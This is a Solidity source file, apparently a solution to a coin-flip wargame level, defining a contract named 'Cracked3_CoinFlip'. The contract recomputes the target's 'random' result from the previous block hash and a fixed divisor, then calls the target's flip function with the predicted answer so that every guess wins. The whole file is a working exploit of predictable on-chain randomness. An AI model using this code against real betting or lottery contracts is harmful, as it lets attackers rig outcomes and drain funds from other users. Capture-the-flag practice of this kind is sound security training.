// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external returns (uint256);
}

contract Cracked3_CoinFlip {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipContracts;
    constructor(address _coinFlip) {
        coinFlipContracts = _coinFlip;
    }

    function guess() public returns (bool resu) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        resu = ICoinFlip(coinFlipContracts).flip(side);
    }
}
